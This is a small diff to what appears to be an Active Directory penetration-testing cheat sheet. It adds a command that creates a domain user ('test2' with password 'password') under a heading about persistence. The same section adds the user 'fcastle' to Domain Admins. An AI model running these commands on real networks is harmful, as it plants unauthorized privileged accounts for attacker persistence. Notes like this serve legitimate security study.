@@ -270,5 +270,6 @@ reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v 
 ### Adding Ourselves to Administrator Group
 ```bash
 #not recommanded but provide persistance
+net user test2 password /add /domain
 net group "Domain Admins" fcastle /ADD /DOMAIN
 ```
